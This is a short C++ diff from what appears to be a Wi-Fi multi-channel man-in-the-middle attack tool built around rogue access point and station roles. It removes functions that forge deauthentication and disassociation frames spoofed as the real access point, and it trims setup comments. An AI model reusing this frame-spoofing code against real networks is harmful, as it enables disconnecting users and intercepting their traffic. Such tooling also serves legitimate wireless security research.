@@ -26,6 +26,7 @@ McMitm::McMitm(ActorPtr rogue_sta, ActorPtr rogue_ap, const ActorPtr &sta, Actor
 	only_to_mitm(only_to_mitm),
 	client_state(
 		sta.get(SK::mac), run_folder ? optional{ run_folder.value() / "observer" / "client_state" } : nullopt) {
+	// save because it will be changes for beacon scan
 	this->netconfig.real_channel  = this->rogue_sta->get_channel();
 	this->netconfig.rogue_channel = this->rogue_ap->get_channel();
 	if(run_folder) {
@@ -49,24 +50,6 @@ void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &t
 			interruptible_sleep(milliseconds(beacon_interval_ms));
 		}
 	}
-}
-
-void McMitm::send_disas(const HWAddress<6> &macaddr) const {
-	Dot11Disassoc disas(macaddr, ap.get(SK::mac));
-	disas.addr3(ap.get(SK::mac));
-	disas.reason_code(0);
-	send_to_rogue(disas);
-	log(LogLevel::INFO, "Rogue channel: injected Disassociation to {}", macaddr);
-}
-
-void McMitm::send_deauth_as_ap() const {
-	Dot11Deauthentication deauth(client_state.get_mac(), ap.get(SK::mac));
-	deauth.addr3(ap.get(SK::mac));
-	deauth.reason_code(3);
-
-	RadioTap rt{};
-	rt.inner_pdu(deauth);
-	send_to_real(rt);
 }
 
 bool McMitm::should_check_rogue_beacons() const {
@@ -99,9 +82,6 @@ void McMitm::setup_real_AP_RSN_frames(int beacon_timeout_sec) {
 		"Monitor mode: using {} on real channel and {} on rogue channel.",
 		rogue_sta.get(SK::iface),
 		rogue_ap.get(SK::iface));
-
-	//if(netconfig.real_channel > 13) log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
-	//netconfig.find_rogue_channel(); //TODO
 
 	// get a probe response for fast replying
 	if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
